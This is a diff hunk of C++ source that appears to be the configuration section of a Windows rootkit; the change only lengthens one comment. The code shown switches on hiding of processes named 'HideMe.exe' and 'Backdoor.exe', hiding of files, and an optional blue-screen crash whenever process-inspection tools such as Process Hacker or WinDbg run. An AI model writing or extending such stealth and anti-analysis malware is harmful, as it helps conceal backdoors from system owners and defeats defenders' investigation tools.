@@ -3,7 +3,7 @@
 //USER CONFIGURATION HERE:
 
 std::vector<const wchar_t *> BSODProcesses = {"processhacker.exe", "windbg.exe"}; //Processes that when running trigger a BSOD (can be ignored if BSOD == false)
-std::atomic<bool> BSOD = false; //Enable Blue Screening when Processes from BSODProcesses
+std::atomic<bool> BSOD = false; //Enable Blue Screening when Processes from BSODProcesses are running
 std::atomic<bool> E_HideProcesses = true; //Enable Process hiding
 std::vector<const char *> HideProcesses = {"HideMe.exe", "Backdoor.exe"}; //Processes to hide
 std::atomic<bool> E_HideFiles = true; //Enabling Hiding files
